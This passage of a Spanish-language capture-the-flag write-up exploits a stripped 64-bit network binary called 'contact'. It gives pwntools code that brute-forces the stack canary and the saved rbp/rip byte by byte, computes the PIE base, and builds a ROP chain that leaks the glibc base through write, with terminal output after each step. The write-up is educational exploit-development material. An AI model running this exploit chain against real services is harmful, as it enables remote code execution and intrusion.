<span class="mtk1">    </span><span class="mtk1">canary_prog</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk4">'Canary'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">canary</span><span class="mtk1">) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">            </span><span class="mtk1">test_canary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">canary</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p8(</span><span class="mtk1">b</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk1">canary_prog</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk1">test_canary</span><span class="mtk1">.hex())</span>
<span class="mtk1">            </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'admin:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">test_canary</span><span class="mtk1">)</span>

<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'Done.'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">():</span>
<span class="mtk1">                    </span><span class="mtk1">canary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">test_canary</span>
<span class="mtk1">                    </span><span class="mtk5">break</span>
<span class="mtk1">            </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">EOFError</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">pass</span>
<span class="mtk1">            </span><span class="mtk5">finally</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
<span class="mtk1">                    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">canary_prog</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk1">canary</span><span class="mtk1">.</span><span class="mtk8">hex</span><span class="mtk1">())</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>Despu茅s de algunos minutos, tenemos el canario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">root_exploit.py</span> 127.0.0.1:1337  
[<span class="code-blue">*</span>] './contact'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 00a473852a55d816
</code></pre></div><p>Ahora que hemos fugado el canario, somos capaces de explotar la vulnerabilidad de <em>Buffer Overflow</em>. Sabemos que se trata del canario porque contiene un byte nulo al principio, que previene que sea fugado como una <em>string</em> (las <em>strings</em> en C terminan en un byte nulo). Adem谩s, mientras que no paremos el servidor, el valor del canario o podemos poner <em>hard-coded</em> en el <em>exploit</em> para ahorrar tiempo, ya que no va a cambiar.</p><p>La siguiente protecci贸n que tenemos que burlar es PIE, que significa que el ASLR afecta a las direcciones del propio binario. Por tanto, tenemos que fugar una direcci贸n del binario en tiempo de ejecuci贸n para calcular la direcci贸n base.</p><p>De momento, la 煤nica cosa que podemos hacer para fugar una direcci贸n es continuar con el ataque de fuerza bruta para fugar los valor guardados de <code>$rbp</code> y <code>$rip</code>. Sabemos que <code>vuln</code> retornar谩 a <code>process</code>, por lo que la direcci贸n de retorno est谩 en <code>process</code> (y por tanto, forma parte del binario).</p><p>Podemos seguir usando el mismo or谩culo porque <code>$rbp</code> y <code>$rip</code> se utilizan por el programa para controlar la pila y el flujo de ejecuci贸n, respectivamente. Si modificamos un solo byte de ellos, es muy probable que programa se corrompa, consiguiendo el mismo or谩culo que antes.</p><p>En este punto, podemos extraer el c贸digo de fuerza bruta a una funci贸n para llamarla tres veces:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_value</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">: </span><span class="mtk8 mtku">str</span><span class="mtk1">, <span class="mtk9 mtki">start</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">value</span> <span class="mtk5">=</span> <span class="mtk9 mtki">start</span>
<span class="mtk1">    </span><span class="mtk1">value_prog</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk9 mtki">name</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">            </span><span class="mtk1">test_value</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">value</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p8(</span><span class="mtk1">b</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk1">value_prog</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk1">test_value</span><span class="mtk1">.hex())</span>
<span class="mtk1">            </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'admin:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk9 mtki">payload</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">test_value</span><span class="mtk1">)</span>

<span class="mtk1">            </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'Done.'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">(<span class="mtk9 mtki">timeout</span><span class="mtk5">=</span><span class="mtk6">1</span>):</span>
<span class="mtk1">                    </span><span class="mtk1">value</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">test_value</span>
<span class="mtk1">                    </span><span class="mtk5">break</span>
<span class="mtk1">            </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">EOFError</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">pass</span>
<span class="mtk1">            </span><span class="mtk5">finally</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
<span class="mtk1">                    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">value_prog</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">.hex())</span>

<span class="mtk1">    </span><span class="mtk5">return</span> <span class="mtk1">value</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">56</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">canary</span><span class="mtk1">    </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">brute_force_value</span><span class="mtk1">(</span><span class="mtk1">junk</span><span class="mtk1">,                      </span><span class="mtk4">'Canary    '</span><span class="mtk1">, </span><span class="mtk9 mtki">start</span><span class="mtk5">=</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">saved_rbp</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">brute_force_value</span><span class="mtk1">(</span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">canary</span><span class="mtk1">,             </span><span class="mtk4">'Saved $rbp'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">saved_rip</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">brute_force_value</span><span class="mtk1">(</span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">canary</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">saved_rbp</span><span class="mtk1">, </span><span class="mtk4">'Saved $rip'</span><span class="mtk1">, </span><span class="mtk9 mtki">start</span><span class="mtk5">=</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\x62</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">root_exploit.py</span> 127.0.0.1:1337  
[<span class="code-blue">*</span>] './contact'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary    : 00a473852a55d816
[<span class="code-green">+</span>] Saved $rbp: 00d42e79ff7f0000
[<span class="code-green">+</span>] Saved $rip: 6265406add550000
</code></pre></div><p>Y ah铆 tenemos las fugas de memoria (n贸tese que est谩n invertidas). Us茅 un par谩metro <code>start</code> para darle al proceso de fuerza bruta un byte fijo sobre el que empezar, porque se sabe de antemano que siempre va a ser ese valor. Para ahorrar tiempo, podemos poner estos valores <em>hard-coded</em> en el <em>script</em>, y as铆 no tenemos que hacer la fuerza bruta de nuevo.</p><p>Ahora podemos calcular la direcci贸n base del binario, porque sabemos que <code>vuln</code> vuelve a <code>0x1562</code> (de Ghidra). Podemos tambi茅n verlo con <code>objdump</code> (<code>send</code> se llama justo despu茅s de <code>vuln</code>, pero el binario no muestra los nombres de funciones porque fue despojado de sus s铆mbolos, <em>stripped</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">contact</span> | <span class="code-dark-green">grep</span> -B 6 send

0000000000001090 &lt;htons@plt&gt;:
    1090:       ff 25 b2 2f 00 00       jmp    QWORD PTR [rip+0x2fb2]        # 4048 &lt;__cxa_finalize@plt+0x2ed8&gt;  
    1096:       68 06 00 00 00          push   0x6
    109b:       e9 80 ff ff ff          jmp    1020 &lt;recv@plt-0x10&gt;

00000000000010a0 &lt;<span class="code-red">send</span>@plt&gt;:
<span class="code-dark-cyan">--</span>
    155d:       e8 38 00 00 00          call   159a &lt;__cxa_finalize@plt+0x42a&gt;
    1562:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
    1565:       b9 00 00 00 00          mov    ecx,0x0
    156a:       ba 06 00 00 00          mov    edx,0x6
    156f:       48 8d 35 26 0b 00 00    lea    rsi,[rip+0xb26]        # 209c &lt;__cxa_finalize@plt+0xf2c&gt;
    1576:       89 c7                   mov    edi,eax
    1578:       e8 23 fb ff ff          call   10a0 &lt;<span class="code-red">send</span>@plt&gt;
</code></pre></div><p>Esta es la direcci贸n base del binario:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8 mtku">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">saved_rip</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1562</span>
<span class="mtk1">    </span><span class="mtk1">log</span>.<span class="mtk8">success</span>(<span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk8 mtku">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">root_exploit.py</span> 127.0.0.1:1337  
[<span class="code-blue">*</span>] './contact'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary    : 00a473852a55d816
[<span class="code-green">+</span>] Saved $rbp: 00d42e79ff7f0000
[<span class="code-green">+</span>] Saved $rip: 6265406add550000

[<span class="code-green">+</span>] ELF base address: 0x55dd6a405000
</code></pre></div><p>Como comprobaci贸n, si la direcci贸n base del binario termina en <code>000</code>, entonces generalmente ser谩 correcta. Si no, hay un error en alg煤n lado.</p><h3 id="ataque-ret2libc">Ataque Ret2Libc</h3><p>Ahora que tenemos la direcci贸n base del binario, podemos calcular cualquier direcci贸n del binario usando los <em>offsets</em> correspondientes. Como NX est谩 activa, tenemos que usar <em>Return Oriented Programming</em> (ROP) para ejecutar c贸digo arbitrario. Esta t茅cnica hace uso de <em>gadgets</em>, que son direcciones a instrucciones que terminan en <code>ret</code>, de manera que al ser puestas en la pila sobrescribiendo la direcci贸n de retorno, se van ejecutando una detr谩s de otra (por eso estos <em>payloads</em> se conocen como cadenas ROP o ROP <em>chains</em>). Con ROP, el programa estar谩 saltando a direcciones ejecutables del binario, burlando as铆 la protecci贸n NX.</p><p>El prop贸sito del <em>exploit</em> es realizar un ataque Ret2Libc, que consiste en ejecutar funciones de Glibc. Para ello, necesitamos otra fuga de memoria para burlar el ASLR. La fuga de memoria se tiene que hacer con <code>puts</code> usando como primer argumento una direcci贸n de la GOT. Como se vio anteriormente, la GOT contiene las direcciones de las funciones externas en tiempo de ejecuci贸n. Como las <em>strings</em> en C son punteros, si pasamos una direcci贸n de la GOT a <code>puts</code>, esta funci贸n imprimir谩 el valor guardado en dicha direcci贸n, derivando el la fuga de memoria de una funci贸n de Glibc.</p><p>Para llamar a una funci贸n como <code>puts</code> (que es externa), podemos usar la Tabla de Enlaces a Procedimientos (<em>Procedure Linkage Table</em>, PLT), que es una tabla dentro del binario que realiza un salto a la direcci贸n de la funci贸n correspondiente.</p><p>Luego, tenemos que indicar el par谩metro de <code>puts</code>. Como estamos ante un binario de 64 bits, la convenci贸n de llamadas a funciones dice que los par谩metros de las funciones van en los registros (en orden: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). Hay un <em>gadget</em> 煤til <code>pop rdi; ret</code> que podemos usar para a帽adir un valor dado a <code>$rdi</code> tomado de la pila.</p><p>El procedimiento anterior es la forma cl谩sica de fugar una direcci贸n para posteriormente continuar con un ataque Ret2Libc. Esta vez, es algo distinto. No estamos ejecutando el binario, sino conect谩ndonos a un <em>socket</em>, por lo que no podemos leer de <code>stdout</code>. Entonces, en lugar de <code>puts</code>, tenemos que llamar a <code>write</code> y pasarle el descriptor de archivo del <em>socket</em> (normalmente, <code>4</code>) como primer argumento, la <em>string</em> a imprimir como segundo argumento, y la longitud de la <em>string</em> como tercer argumento.</p><p>Estos son los valores que necesitaremos:</p><ul><li><em>Gadgets</em> <code>pop rdi; ret</code> (<em>offset</em> <code>0x164b</code>), <code>pop rsi; pop r15; ret</code> (<em>offset</em> <code>0x1649</code>), <code>pop rdx; ret</code> (<em>offset</em> <code>0x1265</code>). N贸tese que para configurar <code>$rsi</code> tendremos que poner un valor cualquiera en <code>$r15</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">contact</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop r[ds][ix]'</span>  
0x000000000000164b : <span class="code-red">pop rdi</span> ; ret
0x0000000000001265 : <span class="code-red">pop rdx</span> ; ret
0x0000000000001649 : <span class="code-red">pop rsi</span> ; pop r15 ; ret
</code></pre></div><ul><li>Una funci贸n para hacer el <em>leak</em> (fuga de memoria), por ejemplo <code>send</code> en la GOT (<em>offset</em> <code>0x4050</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -r <span class="mtku">contact</span> | <span class="code-dark-green">grep</span> send
000000004050  000900000007 R_X86_64_JUMP_SLO 0000000000000000 <span class="code-red">send</span>@GLIBC_2.2.5 + 0  

<span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -R <span class="mtku">contact</span> | <span class="code-dark-green">grep</span> send
0000000000004050 R_X86_64_JUMP_SLOT  <span class="code-red">send</span>@GLIBC_2.2.5
</code></pre></div><ul><li><code>write</code> en la PLT (<em>offset</em> <code>0x1050</code>):</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">contact</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'&lt;write@plt&gt;'</span>
0000000000001050 <span class="code-red">&lt;write@plt&gt;</span>:
    154e:       e8 fd fa ff ff          call   1050 <span class="code-red">&lt;write@plt&gt;  
</code></pre></div><p>Todos los valores anteriores se pueden usar para desarrollar el <em>exploit</em> de forma m谩s manual. Esta vez, usar茅 las funciones de <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>, porque sabemos lo que estamos haciendo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">rop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ROP</span><span class="mtk1">(</span><span class="mtk8 mtku">elf</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">socket_fd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">4</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">canary</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">saved_rbp</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rdi'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span>socket_fd<span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rsi'</span><span class="mtk1">, </span><span class="mtk4">'pop r15'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>  
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk8 mtku">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.send)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.</span><span class="mtk8">find_gadget</span><span class="mtk1">([</span><span class="mtk4">'pop rdx'</span><span class="mtk1">, </span><span class="mtk4">'ret'</span><span class="mtk1">])[</span><span class="mtk6">0</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">8</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk8 mtku">elf</span><span class="mtk1">.</span><span class="mtk8 mtku">plt</span><span class="mtk1">.write)</span>

<span class="mtk1">    </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'admin:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">        </span><span class="mtk1">send_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">send_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">symbols</span><span class="mtk1">.send</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked send() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">send_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address   : </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>Y as铆, obtenemos la fuga de memoria y podemos calcular la direcci贸n base de Glibc (restando el <em>offset</em> de <code>send</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">root_exploit.py</span> 127.0.0.1:1337
[<span class="code-blue">*</span>] './contact'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary    : 00a473852a55d816
[<span class="code-green">+</span>] Saved $rbp: 00d42e79ff7f0000
[<span class="code-green">+</span>] Saved $rip: 6265406add550000

[<span class="code-green">+</span>] ELF base address: 0x55dd6a405000

[<span class="code-blue">*</span>] Loaded 15 cached gadgets for 'contact'  

[<span class="code-green">+</span>] Leaked send() address: 0x7f86cf406c30
[<span class="code-green">+</span>] Glibc base address   : 0x7f86cf2e4000
